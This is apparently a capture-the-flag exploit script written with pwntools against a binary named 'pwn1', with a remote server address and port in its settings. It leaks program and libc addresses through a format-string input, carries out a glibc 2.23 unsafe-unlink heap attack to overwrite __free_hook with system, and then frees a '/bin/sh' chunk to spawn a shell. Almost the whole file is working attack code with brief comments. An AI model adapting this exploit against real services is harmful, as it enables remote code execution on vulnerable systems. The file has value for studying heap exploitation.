#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    if local == 0:
        return
    binaryname = 'pwn1'
    interruptPoint=[0x1016, 0x1142, 0x202060]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')
local = 1 
if local:
    io = process('./pwn1')
    libc = ELF('/glibc/2.23/64/lib/libc-2.23.so')

else:
    # io = process('./pwn1'  , env = {'LD_PRELOAD':'./libc-2.23.so'})
    io = remote('47.108.135.45', 20354)
    libc = ELF('./libc-2.23.so')

elf = ELF('./pwn1')

def add(index, size, content):
    io.sendlineafter('>> ', '1')
    io.sendlineafter('):', str(index))
    io.sendlineafter('size:\n', str(size))
    io.sendlineafter('tent: \n', content)

def edit(index, content, line = 1):
    io.sendlineafter('>> ', '4')
    io.sendlineafter('index:\n', str(index))
    if line:
        io.sendlineafter('content: \n', content)
    else:
        io.sendafter('content: \n', content)

def delete(index):
    io.sendlineafter('>> ', '2')
    io.sendlineafter('index:\n', str(index))

if __name__ == '__main__':
    io.recvuntil('name: ')
    # gdb.attach(io)
    # debug()
    io.sendline('%11$p><%15$p\n')
    mainaddr = int(io.recvuntil('><', drop = True)[-14:], 16)-28
    elfbase = mainaddr - 0x116a
    success('elfbase', elfbase)

    # io.recvuntil('><')
    lsm = int(io.recv(14), 16) - 240
    libcbase = lsm - libc.sym['__libc_start_main']
    success('libcbase', libcbase)
    libc.address = libcbase
    sys = libc.sym['system']
    success('system', sys)
    
    # size need to bigger than 0x80
    add(0, 0x88, 'a' * 0x87)
    add(1, 0x88, 'b' * 0x87)
    add(2, 0x88, 'c' * 0x87)
    add(3, 0x88, '/bin/sh')

    # unlink operation for chunk[1] + 0x10
    payload = p64(0) + p64(0x91) # in fact,size is not important at all, it can be 0
    payload += p64(elfbase + 0x202070 - 0x18) + p64(elfbase + 0x202070 -0x10) 
    # ptr = elfbase + 0x202090 -> note[1]
    # note[1].fd -> ptr-0x18; fakeFD.bk -> note[1]
    # note[1].bk -> ptr-0x10; fakeBK.fd -> note[1]
    payload  = payload.ljust(0x80, '\x00')
    payload += p64(0x80) + '\x90' # note[1] points to chunk[1] + 0x10, make chunk[1] + 0x10 to unlink
    debug()
    edit(1, payload, 0)
    delete(2) # unlink, now note[1](note+0x10) points to note-8
    edit(1,p64(0x88)+p64(libc.sym['__free_hook'])+p64(0x8)) # note[0] points to __free_hook
    edit(0,p64(libc.sym['system']))
    delete(3)

    io.interactive()
    io.close()
